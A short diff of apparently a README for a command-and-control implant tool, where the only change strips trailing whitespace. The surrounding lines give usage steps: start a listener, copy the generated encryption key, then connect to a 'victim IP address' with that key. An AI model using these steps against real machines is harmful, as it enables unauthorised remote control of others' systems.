@@ -24,7 +24,7 @@ Prerequisites
 Instructions
 
 1. Start listener with the following command: 
-python3 src/c2_implant.py -l 
+python3 src/c2_implant.py -l
 2. Copy the encryption key displayed in the output
 3. Enter victim IP address and encryption key generated
 python3 src/c2_implant.py -c <TARGET_IP> -k <PASTE_KEY_HERE>
